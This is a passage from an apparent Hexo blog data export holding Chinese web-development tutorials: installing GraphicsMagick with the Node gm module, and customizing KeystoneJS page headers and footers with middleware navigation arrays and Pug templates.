class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">H:\\workspace\\gm\\examples&gt;node append</span><br><span class=\"line\"></span><br><span class=\"line\">H:\\workspace\\gm\\examples/imgs/append.jpg created  ::  gm &quot;convert&quot;</span><br><span class=\"line\">&quot;#222&quot; &quot;H:\\workspace\\gm\\examples/imgs/lost.png&quot; &quot;H:\\workspace\\gm\\e</span><br><span class=\"line\">original.jpg&quot; &quot;-append&quot; &quot;H:\\workspace\\gm\\examples/imgs/append.jpg&quot;</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li><p>如果从零开始，实际示例如下：</p>\n<p> 创建根目录:</p>\n<pre><code>mkdir gm-study\n</code></pre><p> 到该目录下:</p>\n<pre><code>cd gm-study\n</code></pre><p> 初始化创建package.json:</p>\n<pre><code>npm init\n</code></pre><p> 安装gm:</p>\n<pre><code>npm install gm --save\n</code></pre><p> 创建执行文件:</p>\n<pre><code>type nul&gt;index.js\n</code></pre><p> 打开index.js并黏贴<a href=\"https://github.com/aheckmann/gm\" target=\"_blank\" rel=\"noopener\">gm</a>官方示例代码并修改路径:</p>\n<pre><code>var fs = require(&apos;fs&apos;)\n, gm = require(&apos;gm&apos;);\n\n// resize and remove EXIF profile data\ngm(&apos;imgs/1.jpg&apos;)\n.resize(240, 240)\n.noProfile()\n.write(&apos;out/resize.png&apos;, function (err) {\nif (!err) console.log(&apos;done&apos;);\n});\n</code></pre><p> 执行node命令:</p>\n<pre><code>node index\n</code></pre></li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"本人背景环境windows7-64位，nodejs-v6-11-0，git-version-2-7-2-windows-1；\"><a href=\"#本人背景环境windows7-64位，nodejs-v6-11-0，git-version-2-7-2-windows-1；\" class=\"headerlink\" title=\"本人背景环境windows7 64位，nodejs v6.11.0，git version 2.7.2.windows.1；\"></a>本人背景环境windows7 64位，nodejs v6.11.0，git version 2.7.2.windows.1；</h2><h2 id=\"具体步骤如下：\"><a href=\"#具体步骤如下：\" class=\"headerlink\" title=\"具体步骤如下：\"></a>具体步骤如下：</h2><ol>\n<li><p>下载<a href=\"ftp://ftp.graphicsmagick.org/pub/GraphicsMagick/windows/\" target=\"_blank\" rel=\"noopener\">GraphicsMagick</a>，一路Next完成安装，然后cmd调用命令窗口输入gm回车，如果能正确显示类似如下信息说明安装成功：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">H:\\workspace\\gm\\examples&gt;gm</span><br><span class=\"line\"></span><br><span class=\"line\">GraphicsMagick 1.3.26 2017-07-04 Q16 http://www.GraphicsMagick.org/</span><br><span class=\"line\">Copyright (C) 2002-2017 GraphicsMagick Group.</span><br><span class=\"line\">Additional copyrights and licenses apply to this software.</span><br><span class=\"line\">See http://www.GraphicsMagick.org/www/Copyright.html for details.</span><br><span class=\"line\">Usage: gm command [options ...]</span><br><span class=\"line\"></span><br><span class=\"line\">Where commands include:</span><br><span class=\"line\">    batch - issue multiple commands in interactive or batch mode</span><br><span class=\"line\">benchmark - benchmark one of the other commands</span><br><span class=\"line\">    compare - compare two images</span><br><span class=\"line\">composite - composite images together</span><br><span class=\"line\">    conjure - execute a Magick Scripting Language (MSL) XML script</span><br><span class=\"line\">    convert - convert an image or sequence of images</span><br><span class=\"line\">    help - obtain usage message for named command</span><br><span class=\"line\">identify - describe an image or image sequence</span><br><span class=\"line\">    mogrify - transform an image or sequence of images</span><br><span class=\"line\">    montage - create a composite image (in a grid) from separate im</span><br><span class=\"line\">    time - time one of the other commands</span><br><span class=\"line\">    version - obtain release version</span><br><span class=\"line\">register - register this application as the source of messages</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>如果只是学习可以cmd命令窗口执行<code>git clone git://github.com/aheckmann/gm.git</code>，然后到该目录下执行<code>npm install</code>完成相关依赖包安装后就可以到examples下试试各种demo了，例如我的执行:</p>\n</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">H:\\workspace\\gm\\examples&gt;node append</span><br><span class=\"line\"></span><br><span class=\"line\">H:\\workspace\\gm\\examples/imgs/append.jpg created  ::  gm &quot;convert&quot;</span><br><span class=\"line\">&quot;#222&quot; &quot;H:\\workspace\\gm\\examples/imgs/lost.png&quot; &quot;H:\\workspace\\gm\\e</span><br><span class=\"line\">original.jpg&quot; &quot;-append&quot; &quot;H:\\workspace\\gm\\examples/imgs/append.jpg&quot;</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li><p>如果从零开始，实际示例如下：</p>\n<p> 创建根目录:</p>\n<pre><code>mkdir gm-study\n</code></pre><p> 到该目录下:</p>\n<pre><code>cd gm-study\n</code></pre><p> 初始化创建package.json:</p>\n<pre><code>npm init\n</code></pre><p> 安装gm:</p>\n<pre><code>npm install gm --save\n</code></pre><p> 创建执行文件:</p>\n<pre><code>type nul&gt;index.js\n</code></pre><p> 打开index.js并黏贴<a href=\"https://github.com/aheckmann/gm\" target=\"_blank\" rel=\"noopener\">gm</a>官方示例代码并修改路径:</p>\n<pre><code>var fs = require(&apos;fs&apos;)\n, gm = require(&apos;gm&apos;);\n\n// resize and remove EXIF profile data\ngm(&apos;imgs/1.jpg&apos;)\n.resize(240, 240)\n.noProfile()\n.write(&apos;out/resize.png&apos;, function (err) {\nif (!err) console.log(&apos;done&apos;);\n});\n</code></pre><p> 执行node命令:</p>\n<pre><code>node index\n</code></pre></li>\n</ol>\n"},{"title":"keystonejs实战之页头页脚","date":"2018-04-09T09:37:06.000Z","_content":"前两篇介绍了入门相关知识及对keystonejs整体可用性评估，这篇介绍下开始实际运用中的页头页脚部分，因为马上项目忙了，这个先匆匆的作个收尾。\n\n不管是用WordPress还是其他CMS系统，应用最宽泛的也是最基础的就是企业宣传类网站，我们就讲下keystonejs实现的头尾改造，效果如下图：\nPC页头\n![图片描述](1.jpg)\n\nPC页脚\n![图片描述](2.jpg)\n\n移动页头\n![图片描述](3.jpg)\n\n移动页脚\n![图片描述](4.jpg)\n\n具体改造也很简单，首先找到H:\\workspace\\keystonejs-project\\routes\\middleware.js文件，然后增加`navLinksCN`代码如下：\n\n```\nexports.initLocals = function(req, res, next) {\n    res.locals.navLinks = [\n        { label: 'Home', key: 'home', href: '/' },\n        { label: 'Blog', key: 'blog', href: '/blog' },\n        { label: 'Gallery', key: 'gallery', href: '/gallery' },\n        { label: 'Contact', key: 'contact', href: '/contact' },\n    ];\n    res.locals.navLinksCN = [\n        { label: '首页', key: 'home', href: '/' },\n        { label: '新闻动态', key: 'blog', href: '/blog' },\n        { label: '作品展示', key: 'gallery', href: '/gallery' },\n        { label: '联系我们', key: 'contact', href: '/contact' },\n    ];\n    res.locals.user = req.user;\n    next();\n};\n```\n然后找到H:\\workspace\\keystonejs-project\\templates\\layouts\\default.pug文件，复制一份，改名如main.pug，接下来就是具体的HTML+CSS部分了。\n\n - 在site.css下方再引入我们自定义的样式文件如：`link(href=\"/styles/style.css\", rel=\"stylesheet\")`；\n - 添加header代码，如：\n```\n\t\t//- HEADER\n\t\tdiv(style='width:100%')\n\n\t\t\t//- Customise your site's navigation by changing the navLinks Array in ./routes/middleware.js\n\t\t\t//- ... or completely change this header to suit your design.\n\t\t\t\n\t\t\t.box1#head\n\t\t\t\t.navBox\n\t\t\t\t\t.mabox\n\t\t\t\t\t\t.weima\n\t\t\t\t\t\t\timg(src='../images/ma.jpg')\n\t\t\t\t\ta.nav-left(href='index')\n\t\t\t\t\t\timg(src='../images/logo.svg')\n\t\t\t\t\t.nav-right\n\t\t\t\t\t\tdiv\n\t\t\t\t\t\t\ta.weibo(href='',target='_blank')\n\t\t\t\t\t\t\ta.weixin\n\t\t\t\t\t\t\ta.gouwuche(href='',target='_blank')\n\t\t\t\t\t.nav-center\n\t\t\t\t\t\n\t\t\t\t\t\tul.menu\n\t\t\t\t\t\t\teach link in navLinksCN\n\t\t\t\t\t\t\t\tli(class=(section == link.key ? 'active' : null)): a(href=link.href)= link.label\n\n\t\t\t\t\t\tnav(role='navigation').navbar.navbar-default\n\t\t\t\t\t\t\t.container-fluid\n\t\t\t\t\t\t\t.navbar-header.text-right\n\t\t\t\t\t\t\t\tbutton(type='button').navbar-toggle\n\t\t\t\t\t\t\t\t\tspan.sr-only 切换导航\n\t\t\t\t\t\t\t\t\tspan.icon-bar\n\t\t\t\t\t\t\t\t\tspan.icon-bar\n\t\t\t\t\t\t\t\t\tspan.icon-bar\n```\n\n - 添加footer部分代码，如：\n\n```\n\t\t//- FOOTER\n\t\t//- .container: #footer\n\n\t\t.box1.foot#foot\n\t\t\t.top\n\t\t\t\t.box2 返回顶部\n\t\t\t.box2\n\t\t\t\t.dianshang\n\t\t\t\t\tspan xxx电商渠道:\n\t\t\t\t\tp \n\t\t\t\t\t\ta(href=\"http://\" target=\"_blank\") 天猫\n\t\t\t\t\t\ta(href=\"http://\" target=\"_blank\") 京东\n\t\t\t\t\t\ta(href=\"http://\" target=\"_blank\") 苏宁\n\t\t\t\t\t\ta(href=\"http://\" target=\"_blank\") 微信商城\n\t\t\t\t.cont\n\t\t\t\t\t.d1\n\t\t\t\t\t\timg(src='../images/ma2.jpg')\n\t\t\t\t\t.d2\n\t\t\t\t\t\tp 正月初五科技有限公司\n\t\t\t\t\t\tp 联系电话：400-8888-888\n\t\t\t\t\t\tp 北京市朝阳区朝阳门大街88号\n\t\t\t\t\t.d3\n\t\t\t\t\t\timg(src='../images/ma2.jpg')\n\t\t\t\tp.bei ©2014-2017 正月初五   版权所有 | 京ICP备88888888号-1\n```\n\n - 最后，把具体views中页面引用的default模板改成main，如：\n\n```\nextends ../layouts/main\n```\n\n好了，重启下应用看看效果吧。\n备注：\npug模板引擎中文文档[pug文档][5]。\n\n\n  [5]: https://pugjs.org/zh-cn/api/getting-started.html","source":"_posts/2018/keystonejs实战之页头页脚.md","raw":"---\ntitle: keystonejs实战之页头页脚\ndate: 2018-04-09 17:37:06\ntags:\n  - keystonejs\n  - cms\ncategories:\n  - 后端\n---\n前两篇介绍了入门相关知识及对keystonejs整体可用性评估，这篇介绍下开始实际运用中的页头页脚部分，因为马上项目忙了，这个先匆匆的作个收尾。\n\n不管是用WordPress还是其他CMS系统，应用最宽泛的也是最基础的就是企业宣传类网站，我们就讲下keystonejs实现的头尾改造，效果如下图：\nPC页头\n![图片描述](1.jpg)\n\nPC页脚\n![图片描述](2.jpg)\n\n移动页头\n![图片描述](3.jpg)\n\n移动页脚\n![图片描述](4.jpg)\n\n具体改造也很简单，首先找到H:\\workspace\\keystonejs-project\\routes\\middleware.js文件，然后增加`navLinksCN`代码如下：\n\n```\nexports.initLocals = function(req, res, next) {\n    res.locals.navLinks = [\n        { label: 'Home', key: 'home', href: '/' },\n        { label: 'Blog', key: 'blog', href: '/blog' },\n        { label: 'Gallery', key: 'gallery', href: '/gallery' },\n        { label: 'Contact', key: 'contact', href: '/contact' },\n    ];\n    res.locals.navLinksCN = [\n        { label: '首页', key: 'home', href: '/' },\n        { label: '新闻动态', key: 'blog', href: '/blog' },\n        { label: '作品展示', key: 'gallery', href: '/gallery' },\n        { label: '联系我们', key: 'contact', href: '/contact' },\n    ];\n    res.locals.user = req.user;\n    next();\n};\n```\n然后找到H:\\workspace\\keystonejs-project\\templates\\layouts\\default.pug文件，复制一份，改名如main.pug，接下来就是具体的HTML+CSS部分了。\n\n - 在site.css下方再引入我们自定义的样式文件如：`link(href=\"/styles/style.css\", rel=\"stylesheet\")`；\n - 添加header代码，如：\n```\n\t\t//- HEADER\n\t\tdiv(style='width:100%')\n\n\t\t\t//- Customise your site's navigation by changing the navLinks Array in ./routes/middleware.js\n\t\t\t//- ... or completely change this header to suit your design.\n\t\t\t\n\t\t\t.box1#head\n\t\t\t\t.navBox\n\t\t\t\t\t.mabox\n\t\t\t\t\t\t.weima\n\t\t\t\t\t\t\timg(src='../images/ma.jpg')\n\t\t\t\t\ta.nav-left(href='index')\n\t\t\t\t\t\timg(src='../images/logo.svg')\n\t\t\t\t\t.nav-right\n\t\t\t\t\t\tdiv\n\t\t\t\t\t\t\ta.weibo(href='',target='_blank')\n\t\t\t\t\t\t\ta.weixin\n\t\t\t\t\t\t\ta.gouwuche(href='',target='_blank')\n\t\t\t\t\t.nav-center\n\t\t\t\t\t\n\t\t\t\t\t\tul.menu\n\t\t\t\t\t\t\teach link in navLinksCN\n\t\t\t\t\t\t\t\tli(class=(section == link.key ? 'active' : null)): a(href=link.href)= link.label\n\n\t\t\t\t\t\tnav(role='navigation').navbar.navbar-default\n\t\t\t\t\t\t\t.container-fluid\n\t\t\t\t\t\t\t.navbar-header.text-right\n\t\t\t\t\t\t\t\tbutton(type='button').navbar-toggle\n\t\t\t\t\t\t\t\t\tspan.sr-only 切换导航\n\t\t\t\t\t\t\t\t\tspan.icon-bar\n\t\t\t\t\t\t\t\t\tspan.icon-bar\n\t\t\t\t\t\t\t\t\tspan.icon-bar\n```\n\n - 添加footer部分代码，如：\n\n```\n\t\t//- FOOTER\n\t\t//- .container: #footer\n\n\t\t.box1.foot#foot\n\t\t\t.top\n\t\t\t\t.box2 返回顶部\n\t\t\t.box2\n\t\t\t\t.dianshang\n\t\t\t\t\tspan xxx电商渠道:\n\t\t\t\t\tp \n\t\t\t\t\t\ta(href=\"http://\" target=\"_blank\") 天猫\n\t\t\t\t\t\ta(href=\"http://\" target=\"_blank\") 京东\n\t\t\t\t\t\ta(href=\"http://\" target=\"_blank\") 苏宁\n\t\t\t\t\t\ta(href=\"http://\" target=\"_blank\") 微信商城\n\t\t\t\t.cont\n\t\t\t\t\t.d1\n\t\t\t\t\t\timg(src='../images/ma2.jpg')\n\t\t\t\t\t.d2\n\t\t\t\t\t\tp 正月初五科技有限公司\n\t\t\t\t\t\tp 联系电话：400-8888-888\n\t\t\t\t\t\tp 北京市朝阳区朝阳门大街88号\n\t\t\t\t\t.d3\n\t\t\t\t\t\timg(src='../images/ma2.jpg')\n\t\t\t\tp.bei ©2014-2017 正月初五   版权所有 | 京ICP备88888888号-1\n```\n\n - 最后，把具体views中页面引用的default模板改成main，如：\n\n```\nextends ../layouts/main\n```\n\n好了，重启下应用看看效果吧。\n备注：\npug模板引擎中文文档[pug文档][5]。\n\n\n  [5]: https://pugjs.org/zh-cn/api/getting-started.html","slug":"2018-keystonejs实战之页头页脚","published":1,"updated":"2019-05-17T02:47:30.207Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8rk001uwovv31p2mxlu","content":"<p>前两篇介绍了入门相关知识及对keystonejs整体可用性评估，这篇介绍下开始实际运用中的页头页脚部分，因为马上项目忙了，这个先匆匆的作个收尾。</p>\n<p>不管是用WordPress还是其他CMS系统，应用最宽泛的也是最基础的就是企业宣传类网站，我们就讲下keystonejs实现的头尾改造，效果如下图：<br>PC页头<br><img src=\"/2018-keystonejs实战之页头页脚/1.jpg\" alt=\"图片描述\"></p>\n<p>PC页脚<br><img src=\"/2018-keystonejs实战之页头页脚/2.jpg\" alt=\"图片描述\"></p>\n<p>移动页头<br><img src=\"/2018-keystonejs实战之页头页脚/3.jpg\" alt=\"图片描述\"></p>\n<p>移动页脚<br><img src=\"/2018-keystonejs实战之页头页脚/4.jpg\" alt=\"图片描述\"></p>\n<p>具体改造也很简单，首先找到H:\\workspace\\keystonejs-project\\routes\\middleware.js文件，然后增加<code>navLinksCN</code>代码如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exports.initLocals = function(req, res, next) &#123;</span><br><span class=\"line\">    res.locals.navLinks = [</span><br><span class=\"line\">        &#123; label: &apos;Home&apos;, key: &apos;home&apos;, href: &apos;/&apos; &#125;,</span><br><span class=\"line\">        &#123; label: &apos;Blog&apos;, key: &apos;blog&apos;, href: &apos;/blog&apos; &#125;,</span><br><span class=\"line\">        &#123; label: &apos;Gallery&apos;, key: &apos;gallery&apos;, href: &apos;/gallery&apos; &#125;,</span><br><span class=\"line\">        &#123; label: &apos;Contact&apos;, key: &apos;contact&apos;, href: &apos;/contact&apos; &#125;,</span><br><span class=\"line\">    ];</span><br><span class=\"line\">    res.locals.navLinksCN = [</span><br><span class=\"line\">        &#123; label: &apos;首页&apos;, key: &apos;home&apos;, href: &apos;/&apos; &#125;,</span><br><span class=\"line\">        &#123; label: &apos;新闻动态&apos;, key: &apos;blog&apos;, href: &apos;/blog&apos; &#125;,</span><br><span class=\"line\">        &#123; label: &apos;作品展示&apos;, key: &apos;gallery&apos;, href: &apos;/gallery&apos; &#125;,</span><br><span class=\"line\">        &#123; label: &apos;联系我们&apos;, key: &apos;contact&apos;, href: &apos;/contact&apos; &#125;,</span><br><span class=\"line\">    ];</span><br><span class=\"line\">    res.locals.user = req.user;</span><br><span class=\"line\">    next();</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>然后找到H:\\workspace\\keystonejs-project\\templates\\layouts\\default.pug文件，复制一份，改名如main.pug，接下来就是具体的HTML+CSS部分了。</p>\n<ul>\n<li>在site.css下方再引入我们自定义的样式文件如：<code>link(href=&quot;/styles/style.css&quot;, rel=&quot;stylesheet&quot;)</code>；</li>\n<li><p>添加header代码，如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//- HEADER</span><br><span class=\"line\">div(style=&apos;width:100%&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t//- Customise your site&apos;s navigation by changing the navLinks Array in ./routes/middleware.js</span><br><span class=\"line\">\t//- ... or completely change this header to suit your design.</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t.box1#head</span><br><span class=\"line\">\t\t.navBox</span><br><span class=\"line\">\t\t\t.mabox</span><br><span class=\"line\">\t\t\t\t.weima</span><br><span class=\"line\">\t\t\t\t\timg(src=&apos;../images/ma.jpg&apos;)</span><br><span class=\"line\">\t\t\ta.nav-left(href=&apos;index&apos;)</span><br><span class=\"line\">\t\t\t\timg(src=&apos;../images/logo.svg&apos;)</span><br><span class=\"line\">\t\t\t.nav-right</span><br><span class=\"line\">\t\t\t\tdiv</span><br><span class=\"line\">\t\t\t\t\ta.weibo(href=&apos;&apos;,target=&apos;_blank&apos;)</span><br><span class=\"line\">\t\t\t\t\ta.weixin</span><br><span class=\"line\">\t\t\t\t\ta.gouwuche(href=&apos;&apos;,target=&apos;_blank&apos;)</span><br><span class=\"line\">\t\t\t.nav-center</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\t\t\tul.menu</span><br><span class=\"line\">\t\t\t\t\teach link in navLinksCN</span><br><span class=\"line\">\t\t\t\t\t\tli(class=(section == link.key ? &apos;active&apos; : null)): a(href=link.href)= link.label</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\tnav(role=&apos;navigation&apos;).navbar.navbar-default</span><br><span class=\"line\">\t\t\t\t\t.container-fluid</span><br><span class=\"line\">\t\t\t\t\t.navbar-header.text-right</span><br><span class=\"line\">\t\t\t\t\t\tbutton(type=&apos;button&apos;).navbar-toggle</span><br><span class=\"line\">\t\t\t\t\t\t\tspan.sr-only 切换导航</span><br><span class=\"line\">\t\t\t\t\t\t\tspan.icon-bar</span><br><span class=\"line\">\t\t\t\t\t\t\tspan.icon-bar</span><br><span class=\"line\">\t\t\t\t\t\t\tspan.icon-bar</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>添加footer部分代码，如：</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//- FOOTER</span><br><span class=\"line\">//- .container: #footer</span><br><span class=\"line\"></span><br><span class=\"line\">.box1.foot#foot</span><br><span class=\"line\">\t.top</span><br><span class=\"line\">\t\t.box2 返回顶部</span><br><span class=\"line\">\t.box2</span><br><span class=\"line\">\t\t.dianshang</span><br><span class=\"line\">\t\t\tspan xxx电商渠道:</span><br><span class=\"line\">\t\t\tp </span><br><span class=\"line\">\t\t\t\ta(href=&quot;http://&quot; target=&quot;_blank&quot;) 天猫</span><br><span class=\"line\">\t\t\t\ta(href=&quot;http://&quot; target=&quot;_blank&quot;) 京东</span><br><span class=\"line\">\t\t\t\ta(href=&quot;http://&quot; target=&quot;_blank&quot;) 苏宁</span><br><span class=\"line\">\t\t\t\ta(href=&quot;http://&quot; target=&quot;_blank&quot;) 微信商城</span><br><span class=\"line\">\t\t.cont</span><br><span class=\"line\">\t\t\t.d1</span><br><span class=\"line\">\t\t\t\timg(src=&apos;../images/ma2.jpg&apos;)</span><br><span class=\"line\">\t\t\t.d2</span><br><span class=\"line\">\t\t\t\tp 正月初五科技有限公司</span><br><span class=\"line\">\t\t\t\tp 联系电话：400-8888-888</span><br><span class=\"line\">\t\t\t\tp 北京市朝阳区朝阳门大街88号</span><br><span class=\"line\">\t\t\t.d3</span><br><span class=\"line\">\t\t\t\timg(src=&apos;../images/ma2.jpg&apos;)</span><br><span class=\"line\">\t\tp.bei ©2014-2017 正月初五   版权所有 | 京ICP备88888888号-1</span><br></pre></td></tr></table></figure>\n<ul>\n<li>最后，把具体views中页面引用的default模板改成main，如：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">extends ../layouts/main</span><br></pre></td></tr></table></figure>\n<p>好了，重启下应用看看效果吧。<br>备注：<br>pug模板引擎中文文档<a href=\"https://pugjs.org/zh-cn/api/getting-started.html\" target=\"_blank\" rel=\"noopener\">pug文档</a>。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>前两篇介绍了入门相关知识及对keystonejs整体可用性评估，这篇介绍下开始实际运用中的页头页脚部分，因为马上项目忙了，这个先匆匆的作个收尾。</p>\n<p>不管是用WordPress还是其他CMS系统，应用最宽泛的也是最基础的就是企业宣传类网站，我们就讲下keystonejs实现的头尾改造，效果如下图：<br>PC页头<br><img src=\"/2018-keystonejs实战之页头页脚/1.jpg\" alt=\"图片描述\"></p>\n<p>PC页脚<br><img src=\"/2018-keystonejs实战之页头页脚/2.jpg\" alt=\"图片描述\"></p>\n<p>移动页头<br><img src=\"/2018-keystonejs实战之页头页脚/3.jpg\" alt=\"图片描述\"></p>\n<p>移动页脚<br><img src=\"/2018-keystonejs实战之页头页脚/4.jpg\" alt=\"图片描述\"></p>\n<p>具体改造也很简单，首先找到H:\\workspace\\keystonejs-project\\routes\\middleware.js文件，然后增加<code>navLinksCN</code>代码如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exports.initLocals = function(req, res, next) &#123;</span><br><span class=\"line\">    res.locals.navLinks = [</span><br><span class=\"line\">        &#123; label: &apos;Home&apos;, key: &apos;home&apos;, href: &apos;/&apos; &#125;,</span><br><span class=\"line\">        &#123; label: &apos;Blog&apos;, key: &apos;blog&apos;, href: &apos;/blog&apos; &#125;,</span><br><span class=\"line\">        &#123; label: &apos;Gallery&apos;, key: &apos;gallery&apos;, href: &apos;/gallery&apos; &#125;,</span><br><span class=\"line\">        &#123; label: &apos;Contact&apos;, key: &apos;contact&apos;, href: &apos;/contact&apos; &#125;,</span><br><span class=\"line\">    ];</span><br><span class=\"line\">    res.locals.navLinksCN = [</span><br><span class=\"line\">        &#123; label: &apos;首页&apos;, key: &apos;home&apos;, href: &apos;/&apos; &#125;,</span><br><span class=\"line\">        &#123; label: &apos;新闻动态&apos;, key: &apos;blog&apos;, href: &apos;/blog&apos; &#125;,</span><br><span class=\"line\">        &#123; label: &apos;作品展示&apos;, key: &apos;gallery&apos;, href: &apos;/gallery&apos; &#125;,</span><br><span class=\"line\">        &#123; label: &apos;联系我们&apos;, key: &apos;contact&apos;, href: &apos;/contact&apos; &#125;,</span><br><span class=\"line\">    ];</span><br><span class=\"line\">    res.locals.user = req.user;</span><br><span class=\"line\">    next();</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>然后找到H:\\workspace\\keystonejs-project\\templates\\layouts\\default.pug文件，复制一份，改名如main.pug，接下来就是具体的HTML+CSS部分了。</p>\n<ul>\n<li>在site.css下方再引入我们自定义的样式文件如：<code>link(href=&quot;/styles/style.css&quot;, rel=&quot;stylesheet&quot;)</code>；</li>\n<li><p>添加header代码，如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//- HEADER</span><br><span class=\"line\">div(style=&apos;width:100%&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t//- Customise your site&apos;s navigation by changing the navLinks Array in ./routes/middleware.js</span><br><span class=\"line\">\t//- ... or completely change this header to suit your design.</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t.box1#head</span><br><span class=\"line\">\t\t.navBox</span><br><span class=\"line\">\t\t\t.mabox</span><br><span class=\"line\">\t\t\t\t.weima</span><br><span class=\"line\">\t\t\t\t\timg(src=&apos;../images/ma.jpg&apos;)</span><br><span class=\"line\">\t\t\ta.nav-left(href=&apos;index&apos;)</span><br><span class=\"line\">\t\t\t\timg(src=&apos;../images/logo.svg&apos;)</span><br><span class=\"line\">\t\t\t.nav-right</span><br><span class=\"line\">\t\t\t\tdiv</span><br><span class=\"line\">\t\t\t\t\ta.weibo(href=&apos;&apos;,target=&apos;_blank&apos;)</span><br><span 